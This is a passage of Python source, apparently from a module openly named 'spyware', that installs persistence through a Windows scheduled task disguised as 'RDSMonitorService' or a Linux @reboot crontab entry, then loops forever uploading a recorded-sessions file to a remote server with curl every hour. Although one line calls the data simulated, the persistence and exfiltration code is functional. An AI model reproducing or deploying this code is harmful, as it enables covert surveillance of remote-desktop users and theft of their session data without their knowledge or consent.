        service_name = "RDSMonitorService"
        service_command = f'schtasks /create /tn {service_name} /tr "pythonw.exe -c import spyware; spyware.spyware_remote_desktop_monitor(\'{output_file}\', \'{remote_server}\')" /sc daily /st 00:00'
    else:
        service_name = "rdsmonitor"
        service_command = f'echo "@reboot python3 -c import spyware; spyware.spyware_remote_desktop_monitor(\'{output_file}\', \'{remote_server}\')" | crontab -'

    subprocess.run(service_command, shell=True)

    # Periodically save and upload the recorded sessions
    while True:
        with open(output_file, 'a') as f:
            f.write("\nAdditional simulated session data")
        subprocess.run(['curl', '-T', output_file, remote_server])
        time.sleep(3600)  # Wait for an hour before the next upload
